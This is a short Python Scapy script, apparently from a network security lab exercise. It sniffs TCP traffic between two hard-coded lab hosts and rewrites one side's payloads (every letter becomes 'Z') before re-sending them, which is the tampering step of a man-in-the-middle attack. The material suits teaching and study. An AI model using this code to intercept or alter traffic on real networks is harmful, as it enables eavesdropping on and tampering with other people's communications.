#!/usr/bin/env python3
from scapy.all import *

IP_A = "172.21.0.4"
MAC_A = "02:42:ac:15:00:04"
IP_B = "172.21.0.2"
MAC_B = "02:42:ac:15:00:02"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data
            data = data.decode()
            # newdata = data # No change is made in this sample code
            newdata = re.sub(r'[a-zA-Z]',r'Z', data)
            print(data + "==>" + newdata)
            send(newpkt/newdata, verbose=False)
        else:
            send(newpkt, verbose=False)
        ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = "tcp and (ether src 02:42:ac:15:00:04 or ether src 02:42:ac:15:00:02 )"
pkt = sniff(filter=f, prn=spoof_pkt)